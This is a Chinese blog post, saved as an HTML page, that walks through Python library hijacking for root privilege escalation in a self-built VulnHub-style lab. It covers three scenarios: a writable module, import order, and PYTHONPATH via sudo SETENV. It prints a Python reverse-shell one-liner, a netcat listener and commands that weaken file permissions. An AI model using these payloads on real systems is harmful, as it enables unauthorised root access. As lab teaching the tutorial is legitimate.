@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Python库劫持之前在做VulnHub的时候需要利用Python库劫持，决定具体学习一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python库劫持">
+<meta property="og:url" content="http://example.com/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="Jasontt&#39;s Blog">
+<meta property="og:description" content="Python库劫持之前在做VulnHub的时候需要利用Python库劫持，决定具体学习一下">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150511113.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150621602.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154813928.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154213109.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113155600081.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113160108886.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113201726611.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202321662.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202238717.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204427695.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204122692.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095634860.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095831722.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104814072.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104929691.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110116530.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110438495.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114140349756.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141144288.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141929803.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142141860.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142447882.png">
+<meta property="article:published_time" content="2022-01-14T06:29:14.000Z">
+<meta property="article:modified_time" content="2022-01-14T06:30:38.097Z">
+<meta property="article:author" content="Jason Tu">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150511113.png">
+
+
+<link rel="canonical" href="http://example.com/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/","path":"2022/01/14/Python库劫持/","title":"Python库劫持"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Python库劫持 | Jasontt's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Jasontt's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python%E5%BA%93%E5%8A%AB%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">Python库劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="nav-number">1.2.</span> <span class="nav-text">Python脚本编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%88%E5%86%99%E6%9D%83%E9%99%90%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">场景一（写权限）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%9B%E5%BB%BA"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%88%E4%BC%98%E5%85%88%E9%A1%BA%E5%BA%8F%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">场景二（优先顺序）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%9B%E5%BB%BA-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%88Python-PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%89"><span class="nav-number">1.5.</span> <span class="nav-text">场景三（Python PATH环境变量）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%9B%E5%BB%BA-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.6.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jason Tu"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">Jason Tu</p>
+  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">Jiang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/yunqian2017" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017" rel="noopener" target="_blank">Openg</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="Jason Tu">
+      <meta itemprop="description" content="一只谦虚的兔子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jasontt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Python库劫持
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-01-14 14:29:14 / Modified: 14:30:38" itemprop="dateCreated datePublished" datetime="2022-01-14T14:29:14+08:00">2022-01-14</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h1><p>之前在做VulnHub的时候需要利用<strong>Python库劫持</strong>，决定具体学习一下</p>
+<span id="more"></span>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>利用渗透环境中已有的python脚本来提权，该脚本可能引入了其他库，通过对引入文件的错误配置进行利用来提权。能应用到的场景还是有一定局限性</p>
+<h2 id="Python脚本编写"><a href="#Python脚本编写" class="headerlink" title="Python脚本编写"></a>Python脚本编写</h2><p>我这里直接模仿靶机里的python脚本来写了，该脚本引入<strong>webbrowser</strong>模块，使用<strong>open</strong>函数打开baidu</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import webbrowser</span><br><span class="line">print(&quot;welcome hacker~&quot;)</span><br><span class="line">webbrowser.open(&quot;https://www.baidu.com&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150511113.png" alt="image-20220113150511113"></p>
+<p>看一下运行效果</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113150621602.png" alt="image-20220113150621602"></p>
+<h2 id="场景一（写权限）"><a href="#场景一（写权限）" class="headerlink" title="场景一（写权限）"></a>场景一（写权限）</h2><p>该漏洞基于python脚本引入的模块文件的权限</p>
+<p>当正在引入的模块文件的权限为任意用户可编辑时就会成为一个漏洞</p>
+<h3 id="漏洞创建"><a href="#漏洞创建" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154813928.png" alt="image-20220113154813928"></p>
+<p>提前准备的<strong>hack.py</strong>引入了<strong>webbrowser</strong>模块，为了演示第一种漏洞利用，找到该模块文件并赋予任意用户可编辑权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate webbrowser.py</span><br><span class="line">sudo chmod 777 /usr/lib/python3.8/webbrowser.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113154213109.png" alt="image-20220113154213109"></p>
+<p>接下来创建一种运行<strong>hack.py</strong>的方法，通过修改**/etc/sudoers**</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113155600081.png" alt="image-20220113155600081"></p>
+<p>攻击者在远程连接后，可以通过如图方式来执行<strong>hack.py</strong></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>rabbit</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113160108886.png" alt="image-20220113160108886"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现，可以以root免密执行<strong>hack.py</strong></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113201726611.png" alt="image-20220113201726611"></p>
+<p>为任意用户可写，此时有<strong>两种方式</strong>来获得root权限</p>
+<blockquote>
+<ol>
+<li>直接在webbrowser.py中写入命令获取root的shell</li>
+<li>webbrowser.py的open函数中写入命令，反弹shell获得root权限</li>
+</ol>
+</blockquote>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nano /usr/lib/python3.8/webbrowser.py</span><br><span class="line">os.system(&quot;/bin/bash&quot;) //写入的命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202321662.png" alt="image-20220113202321662"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113202238717.png" alt="image-20220113202238717"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>在<strong>webbrowser.py</strong>定义open函数的地方写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;ip&quot;</span>,port));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204427695.png" alt="image-20220113204427695"></p>
+<p>在受害机上执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3.8 /home/wi11/hack.py</span><br></pre></td></tr></table></figure>
+
+<p>接下来在Kali另起一个终端监听刚才写进去的端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220113204122692.png" alt="image-20220113204122692"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="场景二（优先顺序）"><a href="#场景二（优先顺序）" class="headerlink" title="场景二（优先顺序）"></a>场景二（优先顺序）</h2><p>该漏洞基于python脚本在导入模块时，python将按照特定的优先级顺序查找指定的模块文件</p>
+<p>当你导入一个模块，Python 解析器对模块位置的搜索顺序是：</p>
+<ol>
+<li>当前目录</li>
+<li>如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。</li>
+<li>如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/。</li>
+</ol>
+<p>如果<strong>可执行脚本所属者</strong>和<strong>攻击者获得的用户</strong>为同一用户，就可以在python脚本文件所属目录下创建一个模块文件，这样就会优先导入”伪造的模块“，最终实现提权</p>
+<h3 id="漏洞创建-1"><a href="#漏洞创建-1" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p>首先把场景一中修改的**/usr/lib/python3.8/webbrowser.py**权限恢复原样</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095634860.png" alt="image-20220114095634860"></p>
+<p>修改**/etc/sudoers<strong>，场景一中我们设置的是</strong>rabbit<strong>用户，这次我们改为</strong>wi11**用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114095831722.png" alt="image-20220114095831722"></p>
+<p>其他内容不变</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>wi11</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104814072.png" alt="image-20220114104814072"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现，可以以root免密执行<strong>hack.py</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png" alt="image-20220114105236849"></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114104929691.png" alt="image-20220114104929691"></p>
+<p>当前用户不可写，另寻出路</p>
+<p>由于<strong>hack.py</strong>在**/home/wi11<strong>目录下，并且攻击者用</strong>wi11<strong>远程连接，</strong>可执行脚本所属者<strong>和</strong>攻击者获得的用户**为同一用户</p>
+<p>此时可利用python在导入模块的优先顺序来获得root权限</p>
+<p>在**/home/wi11<strong>目录下创建</strong>webbrowser.py**，内容为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110116530.png" alt="image-20220114110116530"></p>
+<p>接下来在Kali另起一个终端监听刚才写进去的端口，执行<strong>hack.py</strong>脚本</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114110438495.png" alt="image-20220114110438495"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="场景三（Python-PATH环境变量）"><a href="#场景三（Python-PATH环境变量）" class="headerlink" title="场景三（Python PATH环境变量）"></a>场景三（Python PATH环境变量）</h2><p>此漏洞基于通过<strong>PYTHONPATH</strong>环境变量搜索Python库，当攻击者可以修改该变量，就会产生漏洞</p>
+<h3 id="漏洞创建-2"><a href="#漏洞创建-2" class="headerlink" title="漏洞创建"></a>漏洞创建</h3><p>先把受害机所有配置还原为初始状态，删除**/home/wi11<strong>目录下的</strong>webbrowser.py**</p>
+<p>修改**/etc/sudoers<strong>，这次使用</strong>rabbit<strong>用户并且添加</strong>SETENV**，允许sudo使用当前用户命令行中设置的环境变量</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114140349756.png" alt="image-20220114140349756"></p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>假设攻击者已经拿下了<strong>rabbit</strong>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141144288.png" alt="image-20220114141144288"></p>
+<p><code>sudo -l</code>查看当前用户可执行的指令发现可以以root免密执行<strong>hack.py</strong>并且允许sudo设置环境变量</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114105236849.png" alt="image-20220114105236849"></p>
+<p>读取<strong>hack.py</strong>的内容，其中引入了<strong>webbrowser</strong>库，<code>locate</code>定位<strong>webbrowser.py</strong>发现有很多</p>
+<p>由于使用的是<strong>python3.8</strong>来执行脚本，查看**/usr/lib/python3.8/webbrowser.py**的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114141929803.png" alt="image-20220114141929803"></p>
+<p>没有写入权限，场景一方法不可用</p>
+<p>还记得Python 解析器对模块位置的搜索顺序么？</p>
+<p>第一优先级为python脚本当前目录，但是攻击者只获得了<strong>rabbit</strong>用户，而python脚本在**/home/wi11**目录下</p>
+<p>第二优先级为Python搜索在shell变量<strong>PYTHONPATH</strong>下的每个目录，<strong>rabbit</strong>用户有权限通过sudo设置环境变量！</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142141860.png" alt="image-20220114142141860"></p>
+<p>在**/tmp<strong>目录下新建一个</strong>webbrowser.py**内容同场景二</p>
+<p>接下来在Kali另起一个终端监听刚才写进去的端口，执行<strong>hack.py</strong>脚本并且设置<code>PYTHONPATH=/tmp/</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220114142447882.png" alt="image-20220114142447882"></p>
+<p>成功反弹shell，权限为root</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在开发调试时，能快捷方便的执行任务的重要性可能会优先于环境的安全性，但是调试完毕以后要及时恢复系统的各项配置，不然配置错误可能会导致更加严重后果</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Python/" rel="tag"># Python</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/12/VulnHub-Empire-LupinOne/" rel="prev" title="VulnHub-Empire:LupinOne">
+                  <i class="fa fa-chevron-left"></i> VulnHub-Empire:LupinOne
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
